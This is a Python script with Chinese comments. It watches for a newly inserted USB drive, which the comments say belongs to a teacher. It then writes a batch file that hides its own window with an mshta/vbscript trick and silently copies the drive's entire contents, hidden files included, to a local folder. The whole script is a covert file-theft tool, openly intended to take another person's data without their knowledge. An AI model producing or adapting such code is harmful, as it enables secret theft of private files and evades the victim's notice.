#pip install psutil
import psutil,json,os
from time import sleep

#新建文件夹以存放文件
dir=os.getcwd()
try:
    os.mkdir('files')
except:
    pass
dir=dir+r'\files'

#获取配置信息(wait:等待时间)
try:
    with open('setting.json','r') as f:
        file=f.read()
        setting=json.loads(file)
        wait=int(setting['wait'])
except:
    wait=1 #默认等待时间

#获取磁盘信息
old_disk=psutil.disk_partitions()

#写一个bat隐藏复制时的窗口
def cbat(copydir,dir):
    bat=open('copy.bat','w',encoding='utf-8')
    print('@echo off',file=bat)
    print('if "%1"=="hide" goto CmdBegin',file=bat)
    print('start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit',file=bat)
    print(':CmdBegin',file=bat)
    print(' ',file=bat)
    ml='xcopy '+copydir+' '+dir+' /E /H /R'
    print(ml,file=bat)
    bat.close()

#循环检测是否老师插入U盘
while True:
    new_disk=psutil.disk_partitions()
    print('当前分区数',len(new_disk))
    if len(new_disk)>len(old_disk): #当前分区数变大时，就是老师插入U盘的时候
        for i in old_disk:
            new_disk.remove(i)
        print('开始复制...')
        copydir=str(new_disk[0][0])
        print(copydir)
        sleep(wait) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
        cbat(copydir,dir)
        os.system('copy.bat')
        #os.remove('copy.bat')
        print('bat开始运行...')
        old_disk=psutil.disk_partitions()
    elif len(new_disk)<len(old_disk): #当前分区数变小时，就是老师拔出U盘的时候
        old_disk=psutil.disk_partitions()
        print('waiting...')
        sleep(wait)
    else:
        print('waiting...')
        sleep(wait)